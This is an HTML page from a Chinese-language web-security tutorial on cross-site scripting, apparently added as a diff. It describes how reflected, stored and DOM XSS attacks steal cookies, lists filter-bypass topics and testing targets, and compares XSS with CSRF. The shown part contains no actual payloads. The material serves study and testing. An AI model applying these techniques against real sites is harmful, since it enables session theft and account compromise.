+<li><div><a href="#&#x952E;&#x76D8;&#x4E8B;&#x4EF6;">&#x952E;&#x76D8;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x6846;&#x67B6;&#x5BF9;&#x8C61;&#xFF08;frameobject&#xFF09;&#x4E8B;&#x4EF6;">&#x6846;&#x67B6;/&#x5BF9;&#x8C61;&#xFF08;Frame/Object&#xFF09;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x8868;&#x5355;&#x4E8B;&#x4EF6;">&#x8868;&#x5355;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;">&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x6253;&#x5370;&#x4E8B;&#x4EF6;">&#x6253;&#x5370;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;">&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x591A;&#x5A92;&#x4F53;&#xFF08;media&#xFF09;&#x4E8B;&#x4EF6;">&#x591A;&#x5A92;&#x4F53;&#xFF08;Media&#xFF09;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x52A8;&#x753B;&#x4E8B;&#x4EF6;">&#x52A8;&#x753B;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;">&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;">&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;</a><i></i></div></li>
+<li><div><a href="#&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;">&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x5E38;&#x91CF;">&#x5E38;&#x91CF;</a><i></i></div></li>
+<li><div><a href="#&#x5C5E;&#x6027;">&#x5C5E;&#x6027;</a><i></i></div></li>
+<li><div><a href="#&#x65B9;&#x6CD5;">&#x65B9;&#x6CD5;</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;">&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x65B9;&#x6CD5;">&#x65B9;&#x6CD5;</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;">&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x65B9;&#x6CD5;">&#x65B9;&#x6CD5;</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;">&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x65B9;&#x6CD5;">&#x65B9;&#x6CD5;</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x9F20;&#x6807;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;">&#x9F20;&#x6807;/&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x5C5E;&#x6027;">&#x5C5E;&#x6027;</a><i></i></div></li>
+<li><div><a href="#&#x65B9;&#x6CD5;">&#x65B9;&#x6CD5;</a><i></i></div></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li><div><a href="#xss&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;">XSS&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#javascript&#x4F2A;&#x534F;&#x8BAE;">JavaScript&#x4F2A;&#x534F;&#x8BAE;</a><i></i></div></li>
+<li><div><a href="#&#x7F16;&#x7801;">&#x7F16;&#x7801;</a><i></i></div></li>
+<li><div><a href="#&#x53CC;&#x5199;">&#x53CC;&#x5199;</a><i></i></div></li>
+<li><div><a href="#&#x5927;&#x5C0F;&#x5199;">&#x5927;&#x5C0F;&#x5199;</a><i></i></div></li>
+<li><div><a href="#&#x4E00;&#x4E9B;&#x6848;&#x4F8B;">&#x4E00;&#x4E9B;&#x6848;&#x4F8B;</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;">&#x53C2;&#x8003;&#x94FE;&#x63A5;</a><i></i></div></li>
+</ul>
+</div>
+
+<h2 id="&#x5B9A;&#x4E49;"><a name="&#x5B9A;&#x4E49;" class="anchor-navigation-ex-anchor" href="#&#x5B9A;&#x4E49;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x5B9A;&#x4E49;</h2>
+<p>&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;XSS(Cross Site Scripting)&#xFF0C;&#x4E3A;&#x4E86;&#x4E0D;&#x548C;&#x5C42;&#x53E0;&#x6837;&#x5F0F;&#x8868;(Cascading Style Sheets, CSS)&#x7684;&#x7F29;&#x5199;&#x6DF7;&#x6DC6;&#xFF0C;&#x6545;&#x5C06;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;&#x7F29;&#x5199;&#x4E3A;XSS&#x3002;&#x6076;&#x610F;&#x653B;&#x51FB;&#x8005;&#x5F80;Web&#x9875;&#x9762;&#x91CC;&#x63D2;&#x5165;&#x6076;&#x610F;Script&#x4EE3;&#x7801;&#xFF0C;&#x5F53;&#x7528;&#x6237;&#x6D4F;&#x89C8;&#x8BE5;&#x9875;&#x9762;&#x65F6;&#xFF0C;&#x5D4C;&#x5165;Web&#x91CC;&#x9762;&#x7684;Script&#x4EE3;&#x7801;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x6076;&#x610F;&#x653B;&#x51FB;&#x7528;&#x6237;&#x7684;&#x76EE;&#x7684;&#x3002;XSS&#x653B;&#x51FB;&#x9488;&#x5BF9;&#x7684;&#x662F;&#x7528;&#x6237;&#x5C42;&#x9762;&#x7684;&#x653B;&#x51FB;
+XSS&#x5206;&#x4E3A;&#xFF1A;&#x53CD;&#x5C04;&#x578B;XSS&#xFF0C;&#x5B58;&#x50A8;&#x578B;XSS&#xFF0C;DOM&#x578B;XSS</p>
+<h3 id="&#x53CD;&#x5C04;&#x578B;xss"><a name="&#x53CD;&#x5C04;&#x578B;xss" class="anchor-navigation-ex-anchor" href="#&#x53CD;&#x5C04;&#x578B;xss"><i class="fa fa-link" aria-hidden="true"></i></a>1.1.1. &#x53CD;&#x5C04;&#x578B;XSS</h3>
+<p><a href="XSS.assets/2023_05_19_14_07_47_7IQ0cwLZ.png" data-lightbox="ed9044af-6af7-4c76-bc2f-bf7848a8aeb3" data-title="image.png"><img src="XSS.assets/2023_05_19_14_07_47_7IQ0cwLZ.png" alt="image.png"></a>
+&#x5177;&#x4F53;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
+<ol>
+<li>&#x653B;&#x51FB;&#x8005;&#x5C06;payload&#x653E;&#x7F6E;&#x5728;url&#x94FE;&#x63A5;&#x4E2D;&#xFF08;&#x8FD9;&#x662F;&#x9488;&#x5BF9;&#x662F;GET&#x578B;&#x53CD;&#x5C04;XSS&#xFF09;</li>
+<li>&#x7528;&#x6237;&#x70B9;&#x51FB;&#x8BE5;&#x6076;&#x610F;&#x94FE;&#x63A5;</li>
+<li>web&#x670D;&#x52A1;&#x5C06;XSS&#x4EE3;&#x7801;&#xFF08;JavaScript&#x4EE3;&#x7801;&#xFF09;&#x4EE5;&#x53CA;&#x89C6;&#x56FE;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;</li>
+<li>&#x5BA2;&#x6237;&#x7AEF;&#x89E3;&#x6790;&#x89C6;&#x56FE;&#x4EE5;&#x53CA;XSS&#x4EE3;&#x7801;&#xFF08;JavaScript&#x4EE3;&#x7801;&#xFF09;&#xFF0C;&#x5E76;&#x5C06;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x53D1;&#x9001;&#x5230;XSS&#x5E73;&#x53F0;</li>
+<li><p>&#x653B;&#x51FB;&#x8005;&#x8BBF;&#x95EE;XSS&#x5E73;&#x53F0;&#xFF0C;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF08;Cookie&#xFF09;</p>
+<h3 id="&#x5B58;&#x50A8;&#x578B;xss"><a name="&#x5B58;&#x50A8;&#x578B;xss" class="anchor-navigation-ex-anchor" href="#&#x5B58;&#x50A8;&#x578B;xss"><i class="fa fa-link" aria-hidden="true"></i></a>1.1.2. &#x5B58;&#x50A8;&#x578B;XSS</h3>
+<p><a href="XSS.assets/2023_05_19_14_07_47_5t7DnlaU.png" data-lightbox="6eaf21cb-6532-4fd7-9028-8976fee19c1b" data-title="image.png"><img src="XSS.assets/2023_05_19_14_07_47_5t7DnlaU.png" alt="image.png"></a>
+&#x5177;&#x4F53;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
+</li>
+<li><p>&#x653B;&#x51FB;&#x8005;&#x5411;web&#x670D;&#x52A1;&#x63D2;&#x5165;XSS&#x4EE3;&#x7801;</p>
+</li>
+<li>web&#x670D;&#x52A1;&#x4F1A;&#x5C06;&#x5176;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;</li>
+<li>&#x7528;&#x6237;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;web&#x670D;&#x52A1;</li>
+<li>web&#x670D;&#x52A1;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x4EE5;&#x53CA;&#x89C6;&#x56FE;&#x8FD4;&#x56DE;&#x7ED9;&#x524D;&#x7AEF;&#xFF0C;&#x524D;&#x7AEF;&#x6E32;&#x67D3;&#x89C6;&#x56FE;&#x5E76;&#x52A0;&#x8F7D;&#x6570;&#x636E;&#xFF0C;&#x5176;&#x4E2D;&#x6570;&#x636E;&#x91CC;&#x5305;&#x542B;&#x6076;&#x610F;XSS&#x4EE3;&#x7801;&#xFF08;JavaScript&#x4EE3;&#x7801;&#xFF09;</li>
+<li>&#x5BA2;&#x6237;&#x7AEF;&#x6E32;&#x67D3;&#x89C6;&#x56FE;&#xFF0C;&#x52A0;&#x8F7D;XSS&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x5411;&#x653B;&#x51FB;&#x8005;&#x7684;web&#x670D;&#x52A1;&#x53D1;&#x9001;&#x654F;&#x611F;&#x4FE1;&#x606F;</li>
+<li><p>&#x653B;&#x51FB;&#x8005;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;</p>
+<h3 id="dom&#x578B;xss"><a name="dom&#x578B;xss" class="anchor-navigation-ex-anchor" href="#dom&#x578B;xss"><i class="fa fa-link" aria-hidden="true"></i></a>1.1.3. DOM&#x578B;XSS</h3>
+<p><a href="XSS.assets/2023_05_19_14_07_47_oCrxX7ER.png" data-lightbox="b5b81db8-a2f6-4a81-a71b-c492029d6e0c" data-title="image.png"><img src="XSS.assets/2023_05_19_14_07_47_oCrxX7ER.png" alt="image.png"></a>
+&#x5177;&#x4F53;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
+</li>
+<li><p>&#x653B;&#x51FB;&#x8005;&#x5C06;payload&#x653E;&#x7F6E;&#x5728;url&#x94FE;&#x63A5;&#x4E2D;&#xFF08;&#x8FD9;&#x662F;&#x9488;&#x5BF9;&#x662F;GET&#x578B;&#x53CD;&#x5C04;XSS&#xFF09;</p>
+</li>
+<li>&#x7528;&#x6237;&#x70B9;&#x51FB;&#x6076;&#x610F;&#x94FE;&#x63A5;&#xFF0C;&#x5E76;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;</li>
+<li>&#x6B64;&#x65F6;&#x6D4F;&#x89C8;&#x5668;&#x5BA2;&#x6237;&#x7AEF;&#x5E76;&#x4E0D;&#x4F1A;&#x53D1;&#x8D77;http&#x8BF7;&#x6C42;&#x5230;web&#x670D;&#x52A1;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x5BA2;&#x6237;&#x7AEF;&#x6267;&#x884C;XSS&#xFF08;JavaScript&#x4EE3;&#x7801;&#xFF09;</li>
+<li>&#x6B64;&#x65F6;&#x5C06;XSS&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x53D1;&#x9001;&#x7ED9;&#x653B;&#x51FB;&#x8005;&#x7684;&#x6076;&#x610F;&#x670D;&#x52A1;</li>
+<li>&#x653B;&#x51FB;&#x8005;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;XSS&#x5E73;&#x53F0;&#x5E76;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;<h2 id="xss-&#x7279;&#x5F81;"><a name="xss-&#x7279;&#x5F81;" class="anchor-navigation-ex-anchor" href="#xss-&#x7279;&#x5F81;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. XSS &#x7279;&#x5F81;</h2>
+| &#x7C7B;&#x522B; | &#x7279;&#x5F81; |
+| --- | --- |
+| &#x53CD;&#x5C04;&#x578B;XSS | &#x975E;&#x6301;&#x4E45;&#x5316;&#xFF0C;&#x9700;&#x8981;&#x6B3A;&#x9A97;&#x7528;&#x6237;&#x81EA;&#x5DF1;&#x53BB;&#x70B9;&#x51FB;&#x94FE;&#x63A5;&#x624D;&#x80FD;&#x89E6;&#x53D1;XSS&#x4EE3;&#x7801;&#xFF08;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x6CA1;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x9875;&#x9762;&#x548C;&#x5185;&#x5BB9;&#xFF09;&#xFF0C;&#x4E00;&#x822C;&#x5BB9;&#x6613;&#x51FA;&#x73B0;&#x5728;&#x641C;&#x7D22;&#x9875;&#x9762;&#x3002;&#x53CD;&#x5C04;&#x578B;XSS&#x5927;&#x591A;&#x6570;&#x662F;&#x7528;&#x6765;&#x76D7;&#x53D6;&#x7528;&#x6237;&#x7684;Cookie&#x4FE1;&#x606F;&#x3002; |
+| &#x5B58;&#x50A8;&#x578B;XSS | &#x6301;&#x4E45;&#x5316;&#xFF0C;&#x4EE3;&#x7801;&#x662F;&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x7684;&#xFF0C;&#x5982;&#x5728;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x6216;&#x53D1;&#x8868;&#x6587;&#x7AE0;&#x7B49;&#x5730;&#x65B9;&#xFF0C;&#x63D2;&#x5165;&#x4EE3;&#x7801;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;&#x6216;&#x8FC7;&#x6EE4;&#x4E0D;&#x4E25;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E9B;&#x4EE3;&#x7801;&#x5C06;&#x50A8;&#x5B58;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8BE5;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;&#x8FD9;&#x79CD;XSS&#x6BD4;&#x8F83;&#x5371;&#x9669;&#xFF0C;&#x5BB9;&#x6613;&#x9020;&#x6210;&#x8815;&#x866B;&#xFF0C;&#x76D7;&#x7A83;cookie |
+| DOM&#x578B;XSS | &#x4E0D;&#x7ECF;&#x8FC7;&#x540E;&#x7AEF;&#xFF0C;DOM-XSS&#x6F0F;&#x6D1E;&#x662F;&#x57FA;&#x4E8E;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x6A21;&#x578B;(Document Objeet Model,DOM)&#x7684;&#x4E00;&#x79CD;&#x6F0F;&#x6D1E;&#xFF0C;DOM-XSS&#x662F;&#x901A;&#x8FC7;url&#x4F20;&#x5165;&#x53C2;&#x6570;&#x53BB;&#x63A7;&#x5236;&#x89E6;&#x53D1;&#x7684;&#xFF0C;&#x5176;&#x5B9E;&#x4E5F;&#x5C5E;&#x4E8E;&#x53CD;&#x5C04;&#x578B;XSS&#x3002;DOM&#x7684;&#x8BE6;&#x89E3;&#xFF1A;DOM&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x6A21;&#x578B; |</li>
+</ol>
+<h2 id="xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;"><a name="xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;" class="anchor-navigation-ex-anchor" href="#xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;</h2>
+<table>
+<thead>
+<tr>
+<th>&#x7C7B;&#x522B;</th>
+<th>&#x7279;&#x5F81;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSS</td>
+<td>1. &#x4E3B;&#x8981;&#x662F;&#x52A0;&#x8F7D;JavaScript&#x4EE3;&#x7801;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x6267;&#x884C;<br>2. &#x867D;&#x7136;&#x7ECF;&#x8FC7;&#x540E;&#x7AEF;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#xFF08;&#x5B58;&#x50A8;&#x578B;&#xFF09;&#xFF0C;&#x4F46;&#x4E3B;&#x8981;&#x9700;&#x8981;&#x5BA2;&#x6237;&#x7AEF;&#x6267;&#x884C;XSS&#x4EE3;&#x7801;&#xFF0C;&#x624D;&#x80FD;&#x751F;&#x6548;<br>3. DOM&#x578B;XSS&#x4E00;&#x5B9A;&#x4E0D;&#x7ECF;&#x8FC7;&#x540E;&#x7AEF;&#xFF0C;&#x53EA;&#x662F;&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x7684;&#x653B;&#x51FB;<br>4. XSS&#x653B;&#x51FB;&#x9488;&#x5BF9;&#x7684;&#x662F;&#x7528;&#x6237;&#x5C42;&#x9762;&#x7684;&#x653B;&#x51FB; &#xFF08;&#x653B;&#x51FB;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;</td>
+</tr>
+<tr>
+<td>CSRF</td>
+<td>1. &#x4E3B;&#x8981;&#x662F;&#x6B3A;&#x9A97;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x867D;&#x7136;&#x662F;&#x7531;&#x7528;&#x6237;&#x53D1;&#x8D77;&#xFF0C;&#x4F46;&#x662F;&#x670D;&#x52A1;&#x5668;&#x65E0;&#x6CD5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x662F;&#x4E0D;&#x662F;&#x7528;&#x6237;&#x60F3;&#x8981;&#x53D1;&#x8D77;&#x7684;&#x8BF7;&#x6C42;<br>2. &#x4E00;&#x5B9A;&#x4F1A;&#x7ECF;&#x8FC7;&#x540E;&#x7AEF;&#x5904;&#x7406;&#xFF0C;&#x4E0D;&#x7136;&#x65E0;&#x6CD5;&#x6267;&#x884C;<br>3. CSRF&#x662F;&#x4E00;&#x79CD;&#x8EAB;&#x4EFD;&#x4F2A;&#x9020;&#x653B;&#x51FB;&#xFF0C;&#x6765;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6B3A;&#x9A97;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;&#x624B;&#x6CD5;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="xss-&#x653B;&#x51FB;&#x9762;"><a name="xss-&#x653B;&#x51FB;&#x9762;" class="anchor-navigation-ex-anchor" href="#xss-&#x653B;&#x51FB;&#x9762;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. XSS &#x653B;&#x51FB;&#x9762;</h2>
+<p>XSS&#x4E3B;&#x8981;&#x662F;&#x653B;&#x51FB;&#x5BA2;&#x6237;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x4F46;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4FA7;&#x7684;JavaScript&#x5E76;&#x4E0D;&#x50CF;Node.js&#x8FD9;&#x79CD;&#x540E;&#x7AEF;JavaScript&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;XSS&#x53EA;&#x80FD;&#x7528;&#x6765;&#x5F39;&#x7A97;&#x6D4B;&#x8BD5;&#x5417;&#xFF1F;&#x5B9E;&#x9645;&#x4E0A;&#x5E76;&#x4E0D;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684;JavaScript&#x4EE3;&#x7801;&#x80FD;&#x529B;&#x5F88;&#x5F3A;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;<strong>&#x9493;&#x9C7C;</strong>&#x3001;<strong>&#x7A83;&#x53D6;Cookie&#x3001;&#x4EE4;&#x724C;</strong>&#x3001;<strong>&#x653B;&#x51FB;&#x6D4F;&#x89C8;&#x5668;&#xFF08;2021&#x5E74;4&#x6708;Chrome 0 Day&#xFF09;</strong>&#x3001;<strong>&#x8815;&#x866B;&#x653B;&#x51FB;</strong>&#x3001;<strong>&#x6302;&#x9ED1;&#x9875;&#xFF08;&#x653E;&#x5E7F;&#x544A;&#x5237;&#x6D41;&#x91CF;&#xFF09;</strong>&#x3001;<strong>&#x5185;&#x7F51;&#x63A2;&#x6D4B;&#xFF08;&#x9488;&#x5BF9;HTTP&#xFF0C;websocket&#xFF09;&#x7B49;&#x7B49;</strong></p>
+<h3 id="&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;"><a name="&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;" class="anchor-navigation-ex-anchor" href="#&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.1. &#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</h3>
+<p>&#x5C3D;&#x53EF;&#x80FD;&#x627E;&#x5230;&#x4E00;&#x5207;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x5E76;&#x4E14;&#x80FD;&#x591F;&#x8F93;&#x51FA;&#x5728;&#x9875;&#x9762;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6BD4;&#x5982;&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#xFF1A;</p>
+<ul>
+<li>URL&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x53C2;&#x6570;</li>
+<li>URL&#x672C;&#x8EAB;</li>
+<li>&#x8868;&#x5355;</li>
+<li><p>&#x641C;&#x7D22;&#x6846;</p>
+<h3 id="&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;"><a name="&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.2. &#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</h3>
+</li>
+<li><p>&#x91CD;&#x707E;&#x533A;&#xFF1A;&#x8BC4;&#x8BBA;&#x533A;&#x3001;&#x7559;&#x8A00;&#x533A;&#x3001;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x3001;&#x8BA2;&#x5355;&#x4FE1;&#x606F;&#x7B49;</p>
+</li>
+<li>&#x9488;&#x5BF9;&#x578B;&#xFF1A;&#x7AD9;&#x5185;&#x4FE1;&#x3001;&#x7F51;&#x9875;&#x5373;&#x65F6;&#x901A;&#x8BAF;&#x3001;&#x79C1;&#x4FE1;&#x3001;&#x610F;&#x89C1;&#x53CD;&#x9988;</li>
+<li>&#x5B58;&#x5728;&#x98CE;&#x9669;&#xFF1A;&#x641C;&#x7D22;&#x6846;&#x3001;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x3001;&#x56FE;&#x7247;&#x5C5E;&#x6027;&#x7B49;<h3 id="&#x767D;&#x76D2;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;"><a name="&#x767D;&#x76D2;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;" class="anchor-navigation-ex-anchor" href="#&#x767D;&#x76D2;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.3. &#x767D;&#x76D2;&#x6D4B;&#x8BD5;(&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;)</h3>
+&#x5173;&#x4E8E;XSS&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x4ECE;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x5730;&#x65B9;&#x548C;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x8BCD;&#x5165;&#x624B;&#x3002;
